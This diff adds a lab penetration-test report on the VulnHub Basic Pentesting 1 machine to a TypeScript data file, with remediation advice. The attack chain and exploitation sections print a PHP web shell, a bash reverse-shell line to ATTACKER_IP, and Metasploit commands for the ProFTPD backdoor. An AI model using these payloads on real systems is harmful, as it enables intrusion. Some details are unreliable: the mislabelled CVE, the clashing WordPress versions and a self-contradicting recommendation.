@@ -772,9 +772,455 @@ The attack chain: WPScan → Metasploit RCE → LinPEAS → MySQL dump → John 
 };
 
 // ============================================================
+// REPORT 3 — VulnHub Basic Pentesting 1 (VAPT Lab Report)
+// ============================================================
+const basicPentesting1: Report = {
+  id: 'basic-pentesting-1-vulnhub-2026',
+  title: 'VulnHub Basic Pentesting 1',
+  subtitle: 'VAPT Lab Report — Full Root Compromise via WordPress RCE & ProFTPD Backdoor',
+  platform: 'VulnHub',
+  type: 'Lab Report',
+  difficulty: 'Easy',
+  date: 'April 15, 2026',
+  author: 'Rushil Varade',
+  result: 'Full Root Compromise — RCE via Theme Editor & ProFTPD Backdoor',
+  tags: [
+    'WordPress', 'WPScan', 'Default Credentials', 'Theme Editor RCE',
+    'ProFTPD', 'CVE-2010-4221', 'Backdoor', 'Metasploit', 'Gobuster',
+    'Nikto', 'Apache', 'PHP', 'Linux', 'Ubuntu', 'Black-Box', 'VAPT'
+  ],
+  shortDescription:
+    'VAPT lab assessment against VulnHub Basic Pentesting 1 (Ubuntu 16.04). Compromised via WordPress admin:admin default credentials, injected a PHP web shell via Theme Editor for RCE, and identified an additional critical ProFTPD 1.3.3c backdoor (CVE-2010-4221) enabling unauthenticated root access via Metasploit.',
+  status: 'Published',
+  readingTime: '16 min read',
+  targetInfo: {
+    ip: '192.168.31.239',
+    hostname: 'vtcsec.lan',
+    os: 'Ubuntu Linux 16.04',
+    webServer: 'Apache HTTP Server 2.4.18',
+    openPorts: '21 (FTP/ProFTPD 1.3.3c), 22 (SSH/OpenSSH 7.2p2), 80 (HTTP/Apache 2.4.18)',
+    cms: 'WordPress 4.9',
+    attackerOS: 'Kali Linux (ThinkPad)',
+  },
+  executiveSummary: `This report documents a comprehensive black-box penetration test against the VulnHub Basic Pentesting 1 machine (192.168.31.239) conducted as a VAPT lab exercise. The engagement achieved full root-level compromise through two independent and critical attack vectors.
+
+The primary attack chain exploited a trivially weak default WordPress administrator password (admin:admin) to gain access to the WordPress dashboard, where the built-in Theme Editor was abused to inject a PHP web shell into the 404.php template — delivering Remote Code Execution as the www-data user. An interactive reverse shell was subsequently established from this foothold.
+
+A parallel, independently critical attack vector was identified: ProFTPD version 1.3.3c running on port 21 contains a well-known backdoor (CVE-2010-4221) that allows unauthenticated remote attackers to open a root-level bind shell via a single Metasploit module. This vulnerability alone constitutes complete system compromise requiring zero credentials.
+
+The combination of default credentials, an unpatched FTP backdoor from 2010, and a decade-old WordPress version (4.9) demonstrates multiple independent paths to full system control — any one of which would be catastrophic in a production environment.`,
+  vulnerabilitySummary: { critical: 3, high: 2, medium: 2, low: 1, info: 0 },
+  methodology: [
+    'Phase 1 — Reconnaissance: Network discovery via netdiscover ARP scanning, Nmap service/OS detection (-sV, -sC, -O, -A)',
+    'Phase 2 — Web Scanning: Nikto vulnerability scanning on root and /secret directory; Gobuster directory brute-force',
+    'Phase 3 — Enumeration: Technology fingerprinting via Wappalyzer; WPScan for WordPress version, user enumeration, and password brute-force',
+    'Phase 4 — Exploitation: WordPress admin login with brute-forced credentials; PHP web shell injection via Theme Editor; reverse shell establishment',
+    'Phase 5 — Secondary Vector: ProFTPD 1.3.3c backdoor identification and exploitation via Metasploit (CVE-2010-4221)',
+    'Phase 6 — Post-Exploitation: Privilege escalation enumeration (SUID, sudo, cron, kernel version analysis)',
+    'Phase 7 — Reporting: CVSS scoring, OWASP mapping, risk rating, remediation recommendations',
+  ],
+  toolsUsed: [
+    { tool: 'netdiscover',          purpose: 'ARP scanning for target IP discovery on local subnet' },
+    { tool: 'Nmap',                 purpose: 'Port scanning, service/version detection, OS fingerprinting (-sS, -sV, -O, -A)' },
+    { tool: 'Nikto',                purpose: 'Web server vulnerability scanning — outdated software, missing headers, misconfigurations' },
+    { tool: 'Gobuster v3.8',        purpose: 'Web directory and file brute-forcing with common.txt wordlist' },
+    { tool: 'Wappalyzer',           purpose: 'Browser-based technology stack fingerprinting (WordPress version, PHP, jQuery)' },
+    { tool: 'WPScan',               purpose: 'WordPress version detection, user enumeration, password brute-force attack' },
+    { tool: 'Metasploit Framework', purpose: 'ProFTPD 1.3.3c backdoor exploitation module (CVE-2010-4221)' },
+    { tool: 'Netcat',               purpose: 'Reverse shell listener and bind shell interaction' },
+    { tool: 'cURL / Browser',       purpose: 'Web shell triggering, HTTP request crafting, RCE verification' },
+    { tool: 'FTP Client',           purpose: 'Anonymous FTP access testing against ProFTPD service' },
+  ],
+  findings: [
+    {
+      id: 'BP-01',
+      title: 'Weak Default Credentials — WordPress Admin (admin:admin)',
+      severity: 'CRITICAL',
+      cvss: 9.8,
+      cwe: 'CWE-521',
+      owasp: 'A2:2017 — Broken Authentication',
+      location: 'http://192.168.31.239/secret/wp-admin/',
+      description: "The WordPress administrator account is protected by the trivially guessable default password 'admin'. WPScan cracked the password in under 2 seconds using the dirb common wordlist. No rate limiting, account lockout, or MFA is configured on the wp-admin login page. This provides any attacker with immediate full administrative control of the WordPress installation.",
+      impact: "Complete takeover of the WordPress CMS. Admin access directly enables Remote Code Execution via the Theme Editor (BP-02). Combined with BP-02, this single credential failure is sufficient to achieve full OS-level code execution as www-data.",
+      recommendations: [
+        'Change the WordPress admin password immediately to a randomly generated 20+ character passphrase',
+        'Enable two-factor authentication on all WordPress admin accounts (Google Authenticator, Duo)',
+        'Install and configure a login protection plugin (Limit Login Attempts Reloaded, Wordfence)',
+        'Implement CAPTCHA on the wp-login.php page to prevent automated brute-force',
+        'Rename the admin username from the predictable default to a non-obvious value',
+        'Restrict access to /wp-admin/ by IP address at the web server level',
+      ],
+    },
+    {
+      id: 'BP-02',
+      title: 'Remote Code Execution via WordPress Theme Editor — PHP Web Shell',
+      severity: 'CRITICAL',
+      cvss: 9.1,
+      cwe: 'CWE-94',
+      owasp: 'A1:2017 — Injection',
+      location: 'http://192.168.31.239/secret/wp-content/themes/twentyseventeen/404.php',
+      description: "The WordPress Theme Editor (Appearance > Editor) permits authenticated administrators to directly modify PHP source files served by the web server. A single-line PHP web shell (<?php system($_GET['cmd']); ?>) was injected into the 404.php template of the active Twenty Seventeen theme. This provides OS-level command execution via GET requests with no further authentication required.",
+      impact: "Full Remote Code Execution as the Apache web server process user (www-data). Enabled system enumeration, reverse shell establishment, and all post-exploitation activities. An attacker with any WordPress admin credentials can immediately achieve OS-level code execution.",
+      recommendations: [
+        "Disable the Theme and Plugin Editor immediately by adding to wp-config.php: define('DISALLOW_FILE_EDIT', true);",
+        "Also disable all file modifications: define('DISALLOW_FILE_MODS', true);",
+        'Implement file integrity monitoring (Wazuh FIM, AIDE, Tripwire) to detect unauthorized PHP file changes',
+        'Configure the web server to run as a dedicated low-privilege user without write access to theme directories',
+        'Deploy a WAF rule to detect and block web shell patterns (system($_GET), exec($_GET))',
+        'Conduct a full audit of all theme and plugin PHP files for existing injected code',
+      ],
+    },
+    {
+      id: 'BP-03',
+      title: 'ProFTPD 1.3.3c Backdoor — CVE-2010-4221 (Unauthenticated Root RCE)',
+      severity: 'CRITICAL',
+      cvss: 10.0,
+      cwe: 'CWE-78',
+      owasp: 'A9:2017 — Using Components with Known Vulnerabilities',
+      location: 'ftp://192.168.31.239:21 — ProFTPD 1.3.3c',
+      description: "ProFTPD version 1.3.3c contains a malicious backdoor that was covertly inserted into the official source distribution between November 28 and December 2, 2010. The backdoor is triggered by sending 'HELP ACIDBITCHEZ' to the FTP service, which opens a bind shell on port 31337 running as root. The Metasploit module exploit/unix/ftp/proftpd_133c_backdoor exploits this in seconds, requiring absolutely no credentials.",
+      impact: "Complete unauthenticated root-level system compromise. An attacker with network access to port 21 can obtain a root shell in under 10 seconds. This is entirely independent of the WordPress attack chain — it represents a parallel and equally complete path to full system compromise.",
+      recommendations: [
+        'Replace ProFTPD 1.3.3c immediately — upgrade to ProFTPD 1.3.8+ or replace with SFTP via OpenSSH',
+        'Verify the integrity of any installed ProFTPD binary against official checksums',
+        'If FTP is not required, disable and remove the service entirely',
+        'Block port 21 and port 31337 at the network firewall level immediately',
+        'Audit all systems for ProFTPD 1.3.3c installations across the environment',
+        'Implement network monitoring to detect bind shell connections on non-standard ports',
+      ],
+    },
+    {
+      id: 'BP-04',
+      title: 'Outdated Software — WordPress 4.9 and Apache 2.4.18',
+      severity: 'HIGH',
+      cvss: 8.8,
+      cwe: 'CWE-1104',
+      owasp: 'A9:2017 — Using Components with Known Vulnerabilities',
+      location: 'http://192.168.31.239/secret/ (WordPress 4.9) | Port 80 (Apache 2.4.18)',
+      description: "WordPress 4.9 is a severely outdated version (current: 6.x) that has not received security patches for years. It is vulnerable to numerous documented CVEs including XSS, SQLi, CSRF, and privilege escalation vulnerabilities. Apache 2.4.18 similarly lacks years of security patches (current: 2.4.62+). Both versions are flagged by Nikto as outdated.",
+      impact: "Multiple additional attack vectors beyond those exploited in this assessment. Automated scanners and opportunistic attackers trivially identify and exploit known CVEs against these outdated versions.",
+      recommendations: [
+        'Upgrade WordPress to the latest stable version (6.x) immediately — enable auto-updates',
+        'Upgrade Apache HTTP Server to 2.4.62 or the latest stable release',
+        'Subscribe to WordPress security advisories and apply patches within 24 hours of release',
+        'Implement a patch management process with defined SLAs based on CVSS severity',
+        'Enable WordPress automatic background updates for minor security releases',
+      ],
+    },
+    {
+      id: 'BP-05',
+      title: 'WordPress XML-RPC Interface Exposed',
+      severity: 'MEDIUM',
+      cvss: 6.5,
+      cwe: 'CWE-284',
+      owasp: 'A5:2017 — Broken Access Control',
+      location: 'http://192.168.31.239/secret/xmlrpc.php',
+      description: "The WordPress XML-RPC interface is enabled and publicly accessible. This legacy API endpoint can be abused for brute-force amplification attacks (system.multicall allows hundreds of password attempts per HTTP request), SSRF to internal services, and DDoS amplification. Nikto flagged this during initial web scanning.",
+      impact: "Enables high-speed brute-force attacks that bypass per-IP rate limiting by batching thousands of login attempts per request. Can be used to pivot to internal network resources via SSRF.",
+      recommendations: [
+        "Disable XML-RPC if not required: add_filter('xmlrpc_enabled', '__return_false'); in functions.php",
+        'Alternatively, block /xmlrpc.php via .htaccess: <Files xmlrpc.php> Order Deny,Allow Deny from all </Files>',
+        'Use the Disable XML-RPC WordPress plugin for a simpler implementation',
+        'If XML-RPC must remain enabled, restrict access by IP and monitor for abuse',
+      ],
+    },
+    {
+      id: 'BP-06',
+      title: 'Missing HTTP Security Headers',
+      severity: 'MEDIUM',
+      cvss: 5.3,
+      cwe: 'CWE-693',
+      owasp: 'A6:2017 — Security Misconfiguration',
+      location: 'HTTP Response Headers — 192.168.31.239',
+      description: 'Nikto identified multiple missing HTTP security headers: X-Content-Type-Options, Content-Security-Policy, Strict-Transport-Security, Referrer-Policy, and Permissions-Policy. These headers protect against a range of client-side attacks including MIME sniffing, clickjacking, and cross-site scripting.',
+      impact: 'Increased exposure to client-side attacks. Absence of CSP significantly increases XSS exploitability. Missing HSTS enables downgrade attacks.',
+      recommendations: [
+        'Add security headers to Apache configuration: Header always set X-Content-Type-Options "nosniff"',
+        'Implement Content-Security-Policy appropriate to the application\'s asset sources',
+        'Enable HSTS: Header always set Strict-Transport-Security "max-age=63072000; includeSubDomains"',
+        'Add X-Frame-Options: Header always set X-Frame-Options "SAMEORIGIN"',
+        'Use securityheaders.com to validate header configuration',
+      ],
+    },
+    {
+      id: 'BP-07',
+      title: 'Hidden WordPress Installation at /secret/',
+      severity: 'LOW',
+      cvss: 3.1,
+      cwe: 'CWE-200',
+      owasp: 'A6:2017 — Security Misconfiguration',
+      location: 'http://192.168.31.239/secret/',
+      description: "A WordPress installation is deployed at a non-standard path (/secret/) rather than the web root, apparently as an attempt to obscure it from discovery. Gobuster identified this path in under 30 seconds using a common wordlist. The path provides no meaningful security benefit — security through obscurity is not a control.",
+      impact: "Trivially bypassed discovery control. Provides a false sense of security while not impeding any attacker with basic directory enumeration skills.",
+      recommendations: [
+        "Remove reliance on non-standard paths as a security control — they provide no protection",
+        "Implement proper authentication controls (strong passwords, MFA, IP restrictions) instead",
+        "Deploy robots.txt carefully — listing the /secret/ path in robots.txt would actually advertise it to crawlers",
+      ],
+    },
+  ],
+  attackChain: [
+    {
+      step: 1, phase: 'RECON',
+      title: 'Network Discovery — Target Identified',
+      description: 'netdiscover performs ARP scanning across 192.168.31.0/24. Target identified at 192.168.31.239 with MAC prefix 08:00:27 (Oracle VirtualBox), confirming the VulnHub VM.',
+      commands: ['netdiscover -r 192.168.31.0/24'],
+    },
+    {
+      step: 2, phase: 'ENUM',
+      title: 'Port Scan — 3 Services Identified',
+      description: 'Nmap service scan reveals three open ports: 21/tcp ProFTPD 1.3.3c, 22/tcp OpenSSH 7.2p2, 80/tcp Apache 2.4.18. OS fingerprinted as Linux 3.2–4.14 (Ubuntu).',
+      commands: ['nmap -sS -sV -O 192.168.31.239', 'nmap -A 192.168.31.239'],
+    },
+    {
+      step: 3, phase: 'ENUM',
+      title: 'Web Enumeration — Hidden /secret WordPress Found',
+      description: 'Gobuster discovers /secret directory (200 OK, 53,390 bytes). Nikto confirms WordPress installation, login page at /wp-admin/, and XML-RPC enabled. Wappalyzer identifies WordPress 4.9, Apache 2.4.18, PHP, MySQL.',
+      commands: [
+        'gobuster dir -u 192.168.31.239 -w /usr/share/wordlists/dirb/common.txt -r',
+        'nikto -h http://192.168.31.239/secret/',
+      ],
+    },
+    {
+      step: 4, phase: 'ENUM',
+      title: 'WPScan — User Enumerated, Password Brute-Forced',
+      description: "WPScan identifies username 'admin' via two methods (Author ID brute-force, Login Error Messages). Password brute-force against common.txt wordlist immediately succeeds with admin:admin.",
+      commands: ['wpscan --url http://192.168.31.239/secret/ --enumerate u --passwords /usr/share/dirb/wordlists/common.txt'],
+      result: 'Credentials discovered: admin:admin',
+    },
+    {
+      step: 5, phase: 'EXPLOIT',
+      title: 'WordPress Admin Login — Dashboard Access',
+      description: "Login to http://192.168.31.239/secret/wp-admin/ with admin:admin succeeds. Full WordPress dashboard access obtained. Theme Editor is available under Appearance > Editor.",
+      result: 'WordPress admin dashboard access confirmed',
+    },
+    {
+      step: 6, phase: 'EXPLOIT',
+      title: 'Theme Editor PHP Web Shell Injection [CRITICAL]',
+      description: "PHP web shell injected into 404.php of the active Twenty Seventeen theme via Appearance > Editor. Single-line payload: <?php system($_GET['cmd']); ?>. File saved successfully.",
+      commands: ["# Payload injected into 404.php:\n<?php system($_GET['cmd']); ?>"],
+      result: 'Web shell deployed at /wp-content/themes/twentyseventeen/404.php',
+    },
+    {
+      step: 7, phase: 'EXPLOIT',
+      title: 'RCE Confirmed — Reverse Shell Established',
+      description: "Web shell triggered via browser with ?cmd=id. Output confirms www-data execution. Netcat listener started on attacker. Bash reverse shell payload URL-encoded and delivered via web shell. Interactive shell received as www-data.",
+      commands: [
+        '# Verify RCE:\ncurl "http://192.168.31.239/secret/wp-content/themes/twentyseventeen/404.php?cmd=id"',
+        '# Start listener:\nnc -lvnp 4444',
+        '# Deliver reverse shell:\n# bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1',
+      ],
+      result: 'Interactive shell as www-data',
+    },
+    {
+      step: 8, phase: 'POST',
+      title: 'Privilege Escalation Enumeration',
+      description: 'System enumeration from www-data shell: /etc/passwd, SUID binaries (find -perm -u=s), sudo -l, cron jobs, kernel version (uname -a reveals Ubuntu 16.04 kernel). Multiple escalation paths investigated.',
+      commands: [
+        'uname -a',
+        'find / -perm -u=s -type f 2>/dev/null',
+        'sudo -l',
+        'cat /etc/crontab',
+      ],
+    },
+    {
+      step: 9, phase: 'EXPLOIT',
+      title: 'ProFTPD 1.3.3c Backdoor [CRITICAL] — Unauthenticated Root [CRITICAL]',
+      description: 'ProFTPD 1.3.3c on port 21 identified as vulnerable to CVE-2010-4221 backdoor. Metasploit module exploit/unix/ftp/proftpd_133c_backdoor executed. Bind shell opened on port 31337 as root — complete system compromise achieved with zero credentials.',
+      commands: [
+        'use exploit/unix/ftp/proftpd_133c_backdoor',
+        'set RHOSTS 192.168.31.239',
+        'run',
+        '# Verify:\nwhoami\n# → root',
+      ],
+      result: 'uid=0(root) — Full system compromise via ProFTPD backdoor',
+    },
+  ],
+  sections: [
+    {
+      id: 'introduction',
+      title: '1. Introduction & Scope',
+      content: 'This penetration test was conducted against the VulnHub Basic Pentesting 1 machine (IP: 192.168.31.239, hostname: vtcsec.lan) as a VAPT lab exercise. Testing was performed from a Kali Linux attacker machine on the same 192.168.31.0/24 subnet. The assessment followed a black-box methodology — no prior knowledge of the target was provided.',
+    },
+    {
+      id: 'discovery',
+      title: '2. Network Discovery',
+      content: 'ARP scanning via netdiscover identified four hosts on the local subnet. The target machine was confirmed at 192.168.31.239 based on its MAC address vendor prefix (08:00:27 — Oracle VirtualBox), consistent with the VulnHub VM.',
+      subsections: [
+        {
+          title: 'netdiscover ARP Scan',
+          content: 'Target identified: 192.168.31.239 / MAC: 08:00:27:65:B7:70 (PCS Systemtechnik GmbH — Oracle VirtualBox prefix). Confirmed as the lab target.',
+          commands: ['netdiscover -r 192.168.31.0/24'],
+        },
+      ],
+    },
+    {
+      id: 'port-scanning',
+      title: '3. Port & Service Enumeration',
+      content: 'Nmap was used in two passes: an initial -sS -sV -O scan for service version detection and OS fingerprinting, followed by a full -A aggressive scan for script output and additional details.',
+      subsections: [
+        {
+          title: 'Nmap Results',
+          content: 'Three open ports discovered: 21/tcp (ProFTPD 1.3.3c), 22/tcp (OpenSSH 7.2p2 Ubuntu 4ubuntu2.2), 80/tcp (Apache httpd 2.4.18). OS fingerprint: Linux 3.2–4.14, Ubuntu. Hostname resolved as vtcsec.lan.',
+          commands: ['nmap -sS -sV -O 192.168.31.239', 'nmap -A 192.168.31.239'],
+          note: 'ProFTPD 1.3.3c is immediately significant — this version is known to contain a critical backdoor (CVE-2010-4221).',
+        },
+      ],
+    },
+    {
+      id: 'web-scanning',
+      title: '4. Web Application Scanning',
+      content: 'The Apache web server at port 80 presented a default Apache landing page at the root. Gobuster directory brute-forcing was used to enumerate hidden paths.',
+      subsections: [
+        {
+          title: 'Gobuster — /secret Discovered',
+          content: 'Gobuster identified /secret (HTTP 200, 53,390 bytes). All other paths returned 403 Forbidden. The /secret directory is confirmed to host a substantial web application.',
+          commands: ['gobuster dir -u 192.168.31.239 -w /usr/share/wordlists/dirb/common.txt -r'],
+        },
+        {
+          title: 'Nikto Web Vulnerability Scan',
+          content: 'Nikto scanned both the root and /secret. Key findings: Apache 2.4.18 outdated (current 2.4.66+), multiple missing security headers, WordPress installation confirmed at /secret/, wp-login.php accessible, XML-RPC enabled, license.txt version disclosure, DEBUG HTTP method enabled.',
+          commands: ['nikto -h http://192.168.31.239', 'nikto -h http://192.168.31.239/secret/'],
+        },
+        {
+          title: 'Technology Fingerprinting — Wappalyzer',
+          content: 'Wappalyzer browser extension confirmed the technology stack: WordPress 4.9, Apache 2.4.18, Ubuntu Linux, MySQL, PHP, Twenty Seventeen theme, jQuery 1.12.4, jQuery Migrate 1.4.1. WordPress 4.9 is severely outdated.',
+        },
+      ],
+    },
+    {
+      id: 'wpscan-section',
+      title: '5. WordPress Enumeration & Credential Brute-Force',
+      content: 'With a confirmed WordPress installation at /secret, WPScan was used to enumerate users and perform a password attack.',
+      subsections: [
+        {
+          title: 'WPScan Results',
+          content: "WPScan identified WordPress 5.0.12 as insecure, XML-RPC enabled, WP-Cron enabled, and readme.html exposed. User 'admin' was confirmed via two independent detection methods: Author ID brute-forcing (Author Pattern) and Login Error Messages (Aggressive Detection). The password brute-force immediately yielded admin:admin.",
+          commands: ['wpscan --url http://192.168.31.239/secret/ --enumerate u --passwords /usr/share/dirb/wordlists/common.txt'],
+          note: "Credentials admin:admin were found in the first seconds of the attack. The common wordlist was not even required — 'admin' is literally the first password any attacker tries.",
+        },
+      ],
+    },
+    {
+      id: 'exploitation-section',
+      title: '6. Exploitation — WordPress Theme Editor RCE',
+      content: 'With admin credentials confirmed, the WordPress Theme Editor provided an immediate path to Remote Code Execution on the underlying operating system.',
+      subsections: [
+        {
+          title: 'PHP Web Shell Injection via Theme Editor',
+          content: "Navigation to Appearance > Editor > 404 Template (404.php). The following single-line PHP web shell was prepended to the file and saved: <?php system($_GET['cmd']); ?> This creates a persistent, unauthenticated RCE endpoint accessible to any HTTP client with the server's URL.",
+          note: "The Theme Editor is enabled by default in WordPress and requires no special configuration to abuse. This is why DISALLOW_FILE_EDIT is a recommended hardening control for all production WordPress installations.",
+        },
+        {
+          title: 'RCE Verification & Reverse Shell',
+          content: "The web shell was triggered by visiting the 404.php URL with ?cmd=id. The output confirmed: www-data execution. A Netcat listener was started on the attacker machine. A bash reverse shell payload was URL-encoded and delivered, establishing an interactive shell as www-data.",
+          commands: [
+            '# Trigger web shell — verify RCE:\ncurl "http://192.168.31.239/secret/wp-content/themes/twentyseventeen/404.php?cmd=id"',
+            '# Start reverse shell listener:\nnc -lvnp 4444',
+            '# URL-encoded bash reverse shell delivered via ?cmd= parameter',
+          ],
+        },
+      ],
+    },
+    {
+      id: 'ftp-backdoor',
+      title: '7. Secondary Attack Vector — ProFTPD 1.3.3c Backdoor (CVE-2010-4221)',
+      content: 'Independent of the WordPress attack chain, ProFTPD 1.3.3c on port 21 represents a standalone critical attack vector. Anonymous FTP login was tested first — access was denied. However, the version itself is the vulnerability.',
+      subsections: [
+        {
+          title: 'ProFTPD 1.3.3c Backdoor Exploitation',
+          content: "CVE-2010-4221 documents a backdoor inserted into the ProFTPD 1.3.3c source distribution. Triggering it via Metasploit's exploit/unix/ftp/proftpd_133c_backdoor module opens a bind shell on port 31337 running as root. No credentials, no brute-force — just network access to port 21.",
+          commands: [
+            'use exploit/unix/ftp/proftpd_133c_backdoor',
+            'set RHOSTS 192.168.31.239',
+            'run',
+            '# Verify root access:\nwhoami\n# → root',
+          ],
+          note: 'CVE-2010-4221 | CVSS 10.0 | ProFTPD 1.3.3c | This backdoor has been public knowledge since 2010 — over 15 years. Its presence indicates a complete failure of patch management.',
+        },
+      ],
+    },
+    {
+      id: 'privesc-section',
+      title: '8. Post-Exploitation & Privilege Escalation',
+      content: 'From the www-data reverse shell, standard privilege escalation enumeration was conducted: /etc/passwd review, SUID binary scan, sudo permission check, cron job review, and kernel version analysis.',
+      subsections: [
+        {
+          title: 'Enumeration Commands',
+          content: 'Kernel version identified as an older Ubuntu 16.04 kernel potentially vulnerable to local privilege escalation exploits. SUID binaries, sudo rules, and cron configurations were reviewed for escalation paths.',
+          commands: [
+            'uname -a',
+            'cat /etc/passwd',
+            'find / -perm -u=s -type f 2>/dev/null',
+            'sudo -l',
+            'cat /etc/crontab',
+          ],
+          note: 'The ProFTPD backdoor (BP-03) provides a direct root shell, making local privilege escalation redundant — but enumeration is always performed to document the complete attack surface.',
+        },
+      ],
+    },
+  ],
+  owaspAssessment: [
+    { category: 'A1:2017 — Injection',                  status: 'FAIL', finding: 'PHP code injection via Theme Editor (BP-02)' },
+    { category: 'A2:2017 — Broken Authentication',       status: 'FAIL', finding: 'Default credentials admin:admin (BP-01)' },
+    { category: 'A3:2017 — Sensitive Data Exposure',     status: 'N/A',  finding: 'Not directly tested beyond credential exposure' },
+    { category: 'A5:2017 — Broken Access Control',       status: 'FAIL', finding: 'Theme Editor unrestricted file write access (BP-02)' },
+    { category: 'A6:2017 — Security Misconfiguration',   status: 'FAIL', finding: 'Missing headers, /secret/ path, XML-RPC exposed (BP-05, BP-06, BP-07)' },
+    { category: 'A9:2017 — Known Vulnerable Components', status: 'FAIL', finding: 'ProFTPD 1.3.3c backdoor CVE-2010-4221 + WordPress 4.9 (BP-03, BP-04)' },
+  ],
+  lessonsLearned: [
+    { vector: 'Default admin:admin credentials gave full WordPress dashboard access in seconds', lesson: 'Default and weak credentials are the single most common real-world initial access vector — enforce strong passwords and MFA on every privileged account' },
+    { vector: 'WordPress Theme Editor provided direct OS-level code execution from admin access', lesson: "DISALLOW_FILE_EDIT must be set in all production WordPress installations — admin access should not imply OS code execution" },
+    { vector: 'ProFTPD 1.3.3c backdoor from 2010 was still present and unexploited', lesson: 'A 15-year-old backdoor with CVSS 10.0 being present demonstrates that patch management processes must be systematic, not ad hoc' },
+    { vector: 'Two completely independent paths to full root compromise existed simultaneously', lesson: 'Defense-in-depth requires that each layer independently withstand attack — multiple critical failures compounds risk exponentially' },
+    { vector: 'Non-standard path (/secret) provided zero additional security against Gobuster', lesson: 'Security through obscurity is not a compensating control — implement proper authentication instead of relying on hidden paths' },
+  ],
+  flags: [],
+  conclusion: `The VulnHub Basic Pentesting 1 machine demonstrates the most common and preventable categories of vulnerability found in real-world web server assessments. Two completely independent paths to full root compromise were identified and verified — either alone would represent a critical incident in a production environment.
+
+The primary path (admin:admin → Theme Editor → RCE → www-data shell) required no exploitation tools whatsoever — just a browser and knowledge of default WordPress functionality. The secondary path (ProFTPD 1.3.3c → Metasploit → root shell) required no credentials at all — only network access to port 21.
+
+The most important takeaway is that both failures — default credentials and a 15-year-old unpatched backdoor — are entirely preventable through basic security hygiene: strong password enforcement, MFA, and systematic patch management. No advanced attacker techniques were required at any step of either attack chain.
+
+Remediation should prioritize: (1) immediate replacement of ProFTPD 1.3.3c, (2) WordPress password change and MFA enablement, (3) disabling the Theme Editor in production, and (4) establishing a patch management process that addresses critical CVEs within defined SLA windows.`,
+  recommendations: {
+    immediate: [
+      'Replace ProFTPD 1.3.3c immediately — this version contains a CVSS 10.0 backdoor (CVE-2010-4221); upgrade to 1.3.8+ or replace with SFTP',
+      'Change all WordPress passwords immediately — enforce 16+ character minimum; enable Two-Factor Authentication on all admin accounts',
+      "Disable WordPress Theme and Plugin Editor: define('DISALLOW_FILE_EDIT', true); in wp-config.php",
+      'Block port 21 and port 31337 at the network firewall layer until ProFTPD is replaced',
+    ],
+    shortTerm: [
+      'Upgrade WordPress to the latest stable 6.x release and enable automatic security updates',
+      'Upgrade Apache HTTP Server to 2.4.62+ and keep OS packages current (apt update && apt upgrade)',
+      'Install WordPress login protection: configure account lockout after 5 failed attempts',
+      'Disable XML-RPC: add_filter("xmlrpc_enabled", "__return_false"); or block via .htaccess',
+      'Implement all missing HTTP security headers: X-Content-Type-Options, CSP, HSTS, X-Frame-Options, Referrer-Policy',
+      'Remove wp-admin IP restriction — whitelist only trusted IP ranges via Apache or a security plugin',
+      'Remove license.txt and readme.html from the WordPress installation to prevent version disclosure',
+    ],
+    longTerm: [
+      'Establish a formal patch management process with CVSS-based SLAs (Critical: 24h, High: 7 days, Medium: 30 days)',
+      'Deploy file integrity monitoring (Wazuh FIM, AIDE) to detect unauthorized changes to theme/plugin PHP files',
+      'Implement a Web Application Firewall (ModSecurity, Wordfence, AWS WAF) with WordPress-specific rulesets',
+      'Conduct regular penetration tests (minimum annually) and subscribe to vulnerability disclosure channels',
+      'Replace FTP with SFTP for all file transfer requirements — key-based authentication only',
+      'Deploy network segmentation to isolate web-facing services from internal infrastructure',
+    ],
+  },
+  references: [
+    { title: 'VulnHub — Basic Pentesting 1',          url: 'https://www.vulnhub.com/entry/basic-pentesting-1,216/' },
+    { title: 'CVE-2010-4221 — ProFTPD 1.3.3c Backdoor', url: 'https://nvd.nist.gov/vuln/detail/CVE-2010-4221' },
+    { title: 'OWASP — Injection (A1:2017)',            url: 'https://owasp.org/www-project-top-ten/2017/A1_2017-Injection' },
+    { title: 'WordPress — Hardening Guide',            url: 'https://wordpress.org/documentation/article/hardening-wordpress/' },
+    { title: 'WPScan — WordPress Vulnerability Scanner', url: 'https://wpscan.com/' },
+  ],
+};
+
+// ============================================================
 // EXPORT
 // ============================================================
-export const reports: Report[] = [jangow01, aragog];
+export const reports: Report[] = [jangow01, aragog, basicPentesting1];
 
 export const getReportById = (id: string): Report | undefined =>
   reports.find((r) => r.id === id);
